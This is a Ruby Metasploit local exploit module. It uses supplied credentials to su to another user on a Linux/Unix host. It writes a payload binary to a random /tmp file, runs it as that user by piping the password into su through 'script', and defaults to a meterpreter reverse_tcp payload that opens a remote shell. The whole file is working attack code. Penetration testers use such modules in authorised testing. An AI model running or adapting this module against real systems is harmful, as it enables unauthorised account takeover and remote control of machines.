##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
    include Msf::Post::File
    include Msf::Post::Unix

    Rank = NormalRanking

    def initialize(info = {})
        super(
            update_info(info,
                "Name"           => "Login to Another User with Su on Linux / Unix Systems",
                "Description"    => "This module attempts to create a new login session by
                                     invoking the su command of a valid username and password.

                                     If the login is successful, a new session is created via
                                     the specified payload.",
                "License"        => MSF_LICENSE,
                "Author"         => "Gavin Youker <youkergav@gmail.com>",
                "DisclosureDate" => "Sep 10 2020",
                "Platform"       => ["linux",  "unix"],
                "Arch"           => [ARCH_AARCH64, ARCH_ARMLE, ARCH_X86, ARCH_X64, ARCH_MIPSLE],
                'Targets'        => [['Automatic', {}]],
                "DefaultTarget"  => 0,
                "DefaultOptions" => { "PAYLOAD" => "linux/x86/meterpreter/reverse_tcp" },
                "SessionTypes"   => ["shell", "meterpreter"]
            )
        )

        register_options([
            OptString.new("USERNAME", [true,"Username to authenticate with."]),
            OptString.new("PASSWORD", [true, "Password to authenticate with."])
        ])
    end

    # Main function to run the exploit.
    def exploit()
        fail_with(Failure::NoAccess, "username not found") if not user_exists(datastore["USERNAME"]) # Check if use exists

        # Upload the payload and stager files.
        print_status("Uploading payload to target")
        payload_file = build_payload(payload.encoded_exe)

        # Execute the payload.
        print_status("Attempting to login with su")
        result = exec_payload(datastore["USERNAME"], datastore["PASSWORD"], payload_file)
        cleanup_files([payload_file]) if result
    end

    # Function to build and write the payload.
    def build_payload(contents)
        filepath = "/tmp/#{Rex::Text.rand_text_alpha(8)}"

        write_file(filepath, contents)
        chmod(filepath, 0755)

        return filepath
    end

    # Function to execute the payload through the stager.
    def exec_payload(username, password, payload)
        command = "sh -c 'sleep 1; echo #{escape_chars(password)}' | script /dev/null -qc 'su - #{username} -c #{payload}'"
        response = cmd_exec(command)

        # Check if password was invalid.
        if response.include? "Authentication failure"
            fail_with(Failure::NoAccess, "invalid password")
            return false
        end

        return true
    end

    # Function to clean up exploit process.
    def cleanup_files(files)
        for file in files
            rm_f(file)
        end
    end

    # Function to check if the user exists.
    def user_exists(username)
        for user in get_users()
            if user[:name] == username
                return true
            end
        end

        return false
    end

    # Function to escape bash characters for password.
    def escape_chars(string)
        string = string.gsub("\\", "\\\\\\")
        string = string.gsub("\"", "\\\"")
        string = string.gsub("$", "\\$")
        string = string.gsub("\`", "\\\\\`")

        return string
    end
end
